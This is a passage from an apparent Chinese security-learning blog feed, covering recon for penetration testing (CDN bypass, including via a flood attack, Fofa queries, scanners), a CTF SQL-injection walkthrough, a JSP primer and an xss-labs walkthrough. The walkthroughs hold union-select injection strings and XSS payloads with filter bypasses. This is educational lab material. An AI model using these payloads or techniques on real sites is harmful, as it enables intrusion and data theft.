href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>从国外的服务器ping的原因：（1）绕过国内的cdn（2）避免本地的网络限制【一般直接在国内直接ping的话因为有cdn所以大概率是没有办法ping到服务器的真实ip的】</p><h3 id="2-域名解析历史"><a href="#2-域名解析历史" class="headerlink" title="2.域名解析历史"></a>2.域名解析历史</h3><p>DNS：<a href="https://site.ip138.com/www.baid.com/">https://site.ip138.com/www.baid.com/</a></p><p>通过找一个域名的dns解析历史可以找到曾经暴露过的真实IP</p><h3 id="3-通过cc攻击得到真实ping"><a href="#3-通过cc攻击得到真实ping" class="headerlink" title="3.通过cc攻击得到真实ping"></a>3.通过cc攻击得到真实ping</h3><p>cc攻击靠的是伪装成合法用户来对于目标网站进行大量访问 </p><p>这个攻击会消耗cdn资源从而有可能会访问到一个网站服务器的真实ip</p><h2 id="四、资产搜索引擎"><a href="#四、资产搜索引擎" class="headerlink" title="四、资产搜索引擎"></a>四、资产搜索引擎</h2><p>一个用于解决各种资产搜索引擎语法的脚本：<a href="https://github.com/ChinaRan0/Asset-syntax-conversion">https://github.com/ChinaRan0/Asset-syntax-conversion</a></p><h3 id="1-360quake"><a href="#1-360quake" class="headerlink" title="1.360quake"></a>1.360quake</h3><p><a href="https://quake.360.net/quake/#/searchResult?searchVal=%E7%99%BE%E5%BA%A6&selectIndex=quake_service&latest=true">https://quake.360.net/quake/#/searchResult?searchVal=%E7%99%BE%E5%BA%A6&amp;selectIndex=quake_service&amp;latest=true</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505920.png" alt="1fb991be-b904-4824-b60c-0fb2ca099d57"></p><h3 id="2-Fofa"><a href="#2-Fofa" class="headerlink" title="2.Fofa"></a>2.Fofa</h3><p><a href="https://fofa.info/">https://fofa.info/</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505919.png" alt="5a72adbc-b002-474c-ae2d-f3156158c2c7"></p><p>Fofa在edusrc收集中着重收集C段资产 </p><p>title&#x3D;”beijing” </p><p>header&#x3D;”elastic” </p><p>body&#x3D;”网络空间测绘” </p><p>fid&#x3D;”sSXXGNUO2FefBTcCLIT&#x2F;2Q&#x3D;&#x3D;” </p><p>domain&#x3D;”qq.com” </p><p>icp&#x3D;”京ICP证030173号” </p><p>js_name&#x3D;”js&#x2F;jquery.js” </p><p>js_md5&#x3D;”82ac3f14327a8b7ba49baa208d4eaa15” </p><p>icon_hash&#x3D;”-247388890” </p><p>ip&#x3D;”220.181.111.1&#x2F;24” </p><p>country&#x3D;”CN” </p><p>cert&#x3D;”baidu”</p><p><strong>局域网（私有网络）地址</strong>：</p><ul><li>A类：10.0.0.0 到 10.255.255.255</li><li>B类：172.16.0.0 到 172.31.255.255</li><li>C类：192.168.0.0 到 192.168.255.255</li></ul><p><strong>公网（公共网络）地址</strong>：</p><ul><li>A类：1.0.0.0 到 9.255.255.255 和 11.0.0.0 到 126.255.255.255</li><li>B类：128.0.0.0 到 172.15.255.255 和 172.32.0.0 到 191.255.255.255</li><li>C类：192.0.0.0 到 192.167.255.255 和 192.169.0.0 到 223.255.255.255</li></ul><h3 id="3-奇安信Hunter"><a href="#3-奇安信Hunter" class="headerlink" title="3.奇安信Hunter"></a>3.奇安信Hunter</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505745.png" alt="04fda72d-5965-47de-b588-12615a60c3ee"></p><h2 id="五、各种搜索引擎汇总"><a href="#五、各种搜索引擎汇总" class="headerlink" title="五、各种搜索引擎汇总"></a>五、各种搜索引擎汇总</h2><p>shodan.io傻蛋平台 -常用 </p><p>google.com -常用 </p><p>wigle.net WIFI定位 </p><p>grep.app 50 万个 git 存储库 </p><p>censys.io 类似于傻蛋平台 -常用 </p><p>hunter.io 查找邮箱 -常用 </p><p>fofa.info FOFA -常用 </p><p>zoomeye.org 钟馗之眼 -常用 </p><p>leakix.net 威胁情报 </p><p>searchcode.com 代码搜索 </p><p>urlscan.io 威胁情报 </p><p>publicwww. com代码搜索 </p><p>crt.sh 证书搜索 -常用 </p><p>vulners.com 漏洞库 </p><p>pulsedive.com 威胁情报</p><h2 id="六、指纹识别-CMS识别"><a href="#六、指纹识别-CMS识别" class="headerlink" title="六、指纹识别 CMS识别"></a>六、指纹识别 CMS识别</h2><p>小工具：TideFinger <a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a> </p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505630.png" alt="d5d9a800-b724-4bd9-b1d4-3472f78a6af6"></p><p>在线潮汐指纹识别：<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p><p>wappalyzer：一个比较方便快捷的浏览器扩展</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506410.png" alt="9abe9c70-c44c-4612-b1a1-0a8af89dcbbc"></p><h2 id="七、JS信息搜集"><a href="#七、JS信息搜集" class="headerlink" title="七、JS信息搜集"></a>七、JS信息搜集</h2><p>因为在js代码中也有可能存在敏感信息</p><p>JSFinderPlus：</p><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。该工具在JSFinder上进行了增强，主要有：</p><ul><li>多线程爬虫，支持深度爬取（爬取提取出的所有URL）</li><li>常见高危目录爆破</li><li>敏感信息（手机号、身份证号码等）识别</li><li>生成html报告，方便验证</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506181.png" alt="7c63e3df-abab-4bd1-acf4-91931b19ccd5"></p><h2 id="八、目录扫描"><a href="#八、目录扫描" class="headerlink" title="八、目录扫描"></a>八、目录扫描</h2><p>7kbscan：</p><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute%EF%BC%88%E5%A5%BD%E7%94%A8%EF%BC%89">https://github.com/7kbstorm/7kbscan-WebPathBrute（好用）</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506062.png" alt="6afb91c7-6ef0-496f-a838-ed649f470e06"></p><p>dirsearch：</p><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><h2 id="九、信息泄露"><a href="#九、信息泄露" class="headerlink" title="九、信息泄露"></a>九、信息泄露</h2><p> gsil-pro:<a href="https://github.com/StarLord777/GSIL_PRO">https://github.com/StarLord777/GSIL_PRO</a></p><p>我感觉这个配置起来比gsil更好配一些因为这个工具会把筛选出来的数据给保存到本地（<strong>注意：如果往Windows上装的话一定要改路径 因为这个保存路径默认在linux的root文件夹下</strong>）</p><p>工具展示：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506539.png" alt="386e2c2f-4676-4025-bb7f-dbe6895c74ea"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506080.png" alt="e302f1c3-742d-41ce-b714-5db6dcc1c0d1"></p><p><img src="C:/Users/35358/Desktop/c9802906-0240-4dd2-8acd-7f7188282f35.png" alt="c9802906-0240-4dd2-8acd-7f7188282f35"></p><h2 id="十、社会工程学信息收集"><a href="#十、社会工程学信息收集" class="headerlink" title="十、社会工程学信息收集"></a>十、社会工程学信息收集</h2><p> 针对个人：使用社工库查询，钓鱼；</p><p>针对企业：使用企查查，爱企查</p><h2 id="十二、弱口令"><a href="#十二、弱口令" class="headerlink" title="十二、弱口令"></a>十二、弱口令</h2><p><strong>针对有登录框的可以试试弱口令</strong></p><p>工具：超级弱口令检查工具</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql例题</title>
    <link href="/2024/04/25/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/04/25/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="swpuctf-2021-新生赛-easy-sql"><a href="#swpuctf-2021-新生赛-easy-sql" class="headerlink" title="[swpuctf 2021 新生赛]easy_sql"></a>[swpuctf 2021 新生赛]easy_sql</h1><p>进入页面我们可以看到</p><p>让我们输入点东西如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20210829.png" alt="屏幕截图 2024-01-26 210829"></p><p>然后我们可以在url栏上面看到参数是wllm</p><p>然后输入参数wllm&#x3D;1回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20213610.png" alt="屏幕截图 2024-01-26 213610"></p><p>下一步猜测字段输入：</p><p><code>?wllm=1 order by 1 -- asd</code>   1，2，3…依次增加直到页面显示查询不到最终发现是三个字段</p><p>如图：（是查到第四个字段时查不到的结果）</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20220706.png" alt="屏幕截图 2024-01-26 220706"></p><p>下一步获取库名输入：<code>?wllm=100&#39; union select 1,database(),3 -- asd</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20222155.png" alt="屏幕截图 2024-01-26 222155"></p><p>得到库名为：test_db</p><p>下一步获取表名输入：</p><p>?wllm&#x3D;100’union select 1, table_name,3 from information_schema.tables where table_schema&#x3D;’test_db’ limit 0,1 – asd</p><p>回车如图：（依次获取可知共有两个表）</p><p>![屏幕截图 2024-01-26 223839](C:\Users\35358\Pictures\Screenshots\屏幕截图 2024-01-26 223839.png)</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20223849.png" alt="屏幕截图 2024-01-26 223849"></p><p>下一步获取列名输入：</p><p><code>?wllm=100&#39;union select 1, column_name,3 from information_schema.columns where table_schema=&#39;test_db&#39;and table_name=&#39;test_tb&#39;limit 0,1 -- asd</code></p><p>回车如图：（依次获取此表中的列名发现第二个字段便是flag我们直接找它里面的数据即可）</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20224545.png" alt="屏幕截图 2024-01-26 224545"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20224616.png" alt="屏幕截图 2024-01-26 224616"></p><p>下一步直接获取flag中的数据即可</p><p>输入：</p><p><code>?wllm=100&#39; union select 1,flag,3 from test_tb -- asd</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20225025.png" alt="屏幕截图 2024-01-26 225025"></p><p>得到flag将其提交即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20225059.png" alt="屏幕截图 2024-01-26 225059"></p><p>OVER！</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsp xxs</title>
    <link href="/2024/04/25/jsp%20xxs/"/>
    <url>/2024/04/25/jsp%20xxs/</url>
    
    <content type="html"><![CDATA[<h1 id="Jsp"><a href="#Jsp" class="headerlink" title="Jsp"></a>Jsp</h1><h2 id="1-什么是Jsp"><a href="#1-什么是Jsp" class="headerlink" title="1.什么是Jsp"></a>1.什么是Jsp</h2><p>jsp的全称是java servlet page 它就是java的服务器页面</p><p>因为它相对于servlet传回数据的方法比较简单</p><p>Servlet的本质是一个<strong>基于Java的Web组件</strong>，旨在处理HTTP请求并生成HTTP响应</p><h2 id="2-jsp语法"><a href="#2-jsp语法" class="headerlink" title="2.jsp语法"></a>2.jsp语法</h2><p>脚本程序可包含任意的java语句但是在jsp中不能包含任何文本，html标签和jsp元素</p><p>以下是一个示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>Hello World!<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>&lt;%<br>out.println(&quot;你的 IP 地址 &quot; + request.getRemoteAddr());<br>%&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>    pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><p>上述部分可以用来解决中文编码问题 <strong>注：在以上编码中的@符号是用来标识指令的类型例如引入页面指令或属性</strong></p><p>**注意：在jsp语句中不能使用;来结束表达式 **</p><p>&lt;%@ page …%&gt;：定义页面的依赖属性，比如：脚本语言，error页面还有缓存需求</p><p>&lt;%@ include …%&gt;：包含文件</p><p>&lt;%@ taglib …%&gt;：引入标签库的定义也可以自定义标签</p><p>&lt;%–code–%&gt;：jsp注释</p><p>&lt;%! code %&gt;：用于声明变量，方法及初始化</p><p>&lt;%&#x3D; 表达式 %&gt;：字面意思就是用来写表达式的</p><p>&lt;% code %&gt;：就是代码片段脚本程序</p><p>注：jsp脚本程序，jsp声明以及表达式也可以如下表示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp:scriptlet&gt;<br>   代码片段<br>&lt;/jsp:scriptlet&gt;<br></code></pre></td></tr></table></figure><p>&lt;%代表静态 &lt;%常量 </p><p>%&gt;代表静态 %&gt; 常量</p><p>\ ‘在属性中使用的单引号 （两符号之间不存空格）</p><p>\ “在属性中使用的双引号（两符号之间不存空格）</p><p>JSP行为</p><p>jsp行为标签使用XML语法结构来控制servlet引擎。它能够动态插入一个文件，重用JavaBean组件，引导用户去另一个页面，为Java插件产生相关的HTML等等</p><p>行为标签只有一种语法格式，它严格遵守XML标准：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp:action_name attribute=<span class="hljs-string">&quot;value&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left"><strong>语法</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">jsp:include</td><td align="left">用于在当前页面中包含静态或动态资源</td></tr><tr><td align="left">jsp:useBean</td><td align="left">寻找和初始化一个JavaBean组件</td></tr><tr><td align="left">jsp:setProperty</td><td align="left">设置 JavaBean组件的值</td></tr><tr><td align="left">jsp:getProperty</td><td align="left">将 JavaBean组件的值插入到 output中</td></tr><tr><td align="left">jsp:forward</td><td align="left">从一个JSP文件向另一个文件传递一个包含用户请求的request对象</td></tr><tr><td align="left">jsp:plugin</td><td align="left">用于在生成的HTML页面中包含Applet和JavaBean对象</td></tr><tr><td align="left">jsp:element</td><td align="left">动态创建一个XML元素</td></tr><tr><td align="left">jsp:attribute</td><td align="left">定义动态创建的XML元素的属性</td></tr><tr><td align="left">jsp:body</td><td align="left">定义动态创建的XML元素的主体</td></tr><tr><td align="left">jsp:text</td><td align="left">用于封装模板数据</td></tr></tbody></table><h1 id="xss-lab-前四关"><a href="#xss-lab-前四关" class="headerlink" title="xss-lab 前四关"></a>xss-lab 前四关</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>![屏幕截图 2024-03-07 164845](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-03-07 164845.png)</p><p>如图但我们刚进入页面时发现存在一个get传参name&#x3D;test而且与此同时在页面上也出现了test</p><p>下一步我们可以去看看源代码</p><p>如图：<br><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20165258.png" alt="屏幕截图 2024-03-07 165258"></p><p>发现参数竟然直接出现在页面源代码中因此我们可以尝试去插入一段script代码来让其在html中直接被执行</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20165017.png" alt="屏幕截图 2024-03-07 165017"></p><p>payload：<script>alert(1)</script></p><p>回车即可</p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>当我们进入这关时发现这关和上一关看起来加上了搜索框但从url栏中可以看出还是get传参因此我们可以先使用上一关的payload试一下发现不行 然后查看以页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307171829990.png" alt="image-20240307171829990"></p><p>发现特殊字符被编码成html实体</p><p>可以通过查看后端源码去寻找原因 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20172045.png" alt="屏幕截图 2024-03-07 172045"></p><p><code>htmlspecialchars($str)</code> 函数用于将字符串中的特殊字符转换为HTML实体</p><p>但是我们发现我们传入的值在input标签里面并没有发生变化因此我们可以利用闭合从而使我们的script标签发挥作用</p><p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>回车如图：<img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307172849930.png" alt="image-20240307172849930"></p><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>在进行这关之前需要先知道什么是html事件</p><p>当html代码被实体化尖括号和双引号被全部被实体化后那么就无法使输入的<script>代码被执行那么这时便需要我们使用html事件来进行操作</p><p>参考：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p><p>比较详细看完发现此关有很多payload可以解决但是思路都差不都</p><p>看完后开始解题我们可以先试一下Level 1的payload</p><p>顺便看一下源代码什么情况</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20200640.png" alt="屏幕截图 2024-03-07 200640"></p><p>发现被实体化了</p><p>然后我们尝试输入：' onmoseover="alert(1)" '来闭合但是发现不行</p><p>onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</p><p>查看源代码发现双引号全都变了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307211601073.png" alt="image-20240307211601073"></p><p>然后我们去瞅瞅F12 发现我们的单引号变成了双引号这样我们便可以开始构造</p><p>payload：<code>&#39;onmoseover=&#39;alert(1)</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307214621791.png" alt="image-20240307214621791"></p><p>其余事件同理</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果不行的话可以尝试加分号</p><p>例： </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;onmouseover=alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>在这一关在刚刚开始时可以尝试去输< > " ' 这些符号</p><p>目的是去看看是否存在实体化输入后查看原代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240308191556043.png" alt="image-20240308191556043"></p><p>由图我们可以发现在标签中除了单引号他们都被实体化</p><p>但是在input标签里只有<>这两个符号消失了在这里我们猜测可能使用到了字符串替换来过滤了<>这两个符号 因为只消失了<>而""却显示正常所以在这里猜测它没有实例体化html字符</p><p>如果不确定可以去瞅瞅后端代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240308192904563.png" alt="image-20240308192904563"></p><p>然后我们可以利用input标签</p><p>使用"进行闭合</p><p>所以 payload："onmouseover=alert('xss');"</p><p>我建议在在我们构造payload的时候习惯性的在语句后加上一个分号这样比较保险</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319101710385.png" alt="image-20240319101710385"></p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>进入这关后我们可以先去尝试看看他实体化了哪些字符 先输入" < 试试</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319103503931.png" alt="image-20240319103503931"></p><p>发现在input标签中都可以到这里我还以为随便闭合一下就ok但是当我输入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alter</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>时如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20103721.png" alt="屏幕截图 2024-03-19 103721"></p><p>发现被转义了 此路行不通哪就换一条</p><p>用html事件试一下payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>发现结果一样on也被转义</p><p>最后发现大小写绕过也不行</p><p>因为可以完成闭合所以在这里我们可以用其他标签html中的<a> herf</p><p><code>href</code> 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 <a> 标签中的内容，那么浏览器会尝试检索并显示 <code>href</code> 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表</p><p>具体可以参考<a href="https://www.w3school.com.cn/tags/att_a_href.asp#google_vignette">https://www.w3school.com.cn/tags/att_a_href.asp#google_vignette</a></p><p>因为herf属性的值可以是javascript然后构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>点一下我试试<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>在构造payload的时候第一要注意闭合还有是href最后在这里一定要加上javascript:</p><p>因为如果不加我们在href后的东西有可能被解析为url导致点击后跳转到404页面</p><p>最后结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20111003.png" alt="屏幕截图 2024-03-19 111003"></p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>在这一关没有过滤" < 但是on herf script 均被转义最后试试大写能不能不被转义</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">SCRipt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">Script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319113106089.png"></p><p>其实以上几关的payload把被转义的部分小写变成大写均可以实现xss以上只是其中的一个例子</p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>老样子先来试试他过滤了什么如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20155428.png" alt="屏幕截图 2024-03-19 155428"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20155433.png" alt="屏幕截图 2024-03-19 155433"></p><p>由图可知以上的方法的关键字符均被过滤 然后我又试了大写绕过发现不行</p><p>但是如果他直接删掉的话我们可以通过双写来绕过</p><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;oonnmouseover=alert(&#x27;xss&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="C:\Users\35358\AppData\Roaming\Typora\typora-user-images\image-20240319163609324.png" alt="image-20240319163609324"></p><p>以上只是一个例子以上的代码均可实现双写绕过</p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>在第八关有两个点可以利用一个是input标签另一个是href的属性</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319171415580.png" alt="image-20240319171415580"></p><p>如图发现它实体化了 " 因此input标签闭合这条路便走不通了但是从图中可知它将javascript转义然后我也试了一下大写绕过发现也不行这时候就需要用到一个新知识了</p><h3 id="新知识："><a href="#新知识：" class="headerlink" title="新知识："></a>新知识：</h3><p>href隐藏属性：可以进行自动Unicode解码</p><p>Unicode编码解码工具：<a href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a></p><p>payload：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>Unicode编码后</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><p>输入回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319172734822.png" alt="image-20240319172734822"></p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>在这一关看了一下页面源代码貌似和上一关没有什么不同</p><p>在input标签中" 和 < 均被实体化</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319214641087.png" alt="image-20240319214641087"></p><p>但是当我随便输入一些内容时发现如果输入的不是有效地址而是javascript代码时它压根就不会读如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319173748470.png" alt="image-20240319173748470"></p><p>那到底怎么才算合法不知道可以选择去瞅瞅后端源代码</p><p>如图：</p><p><img 